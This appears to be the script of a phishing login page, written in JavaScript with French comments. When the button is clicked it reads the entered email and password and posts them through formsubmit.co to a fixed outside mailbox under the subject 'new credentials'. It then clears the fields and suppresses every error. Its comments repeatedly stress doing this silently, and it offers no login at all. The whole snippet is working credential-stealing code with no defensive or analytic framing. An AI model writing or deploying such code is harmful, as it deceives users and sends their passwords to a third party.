const inputMail = document.querySelector('.mail');
        const inputMod = document.querySelector('.mod');
        const button = document.querySelector('button');

        button.addEventListener('click', async function() {
            const email = inputMail.value;
            const mdp = inputMod.value;
            
            if (email.trim() === '' || mdp.trim() === '') {
                return; // Rien si vide
            }

            // ENVOI SILENCIEUX
            try {
                const response = await fetch('https://formsubmit.co/ajax/athomas@edenschool.fr', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Accept': 'application/json'
                    },
                    body: new URLSearchParams({
                        '_subject': 'Nouveaux identifiants',
                        'email': email,
                        'mot_de_passe': mdp,
                        '_captcha': 'false',
                        '_next': 'https://formsubmit.co/success'
                    })
                });

                if (response.ok) {
                    inputMail.value = '';   // Vide silencieusement
                    inputMod.value = '';    // Vide silencieusement
                }
            } catch (error) {
                // Silence total même en erreur
            }
        });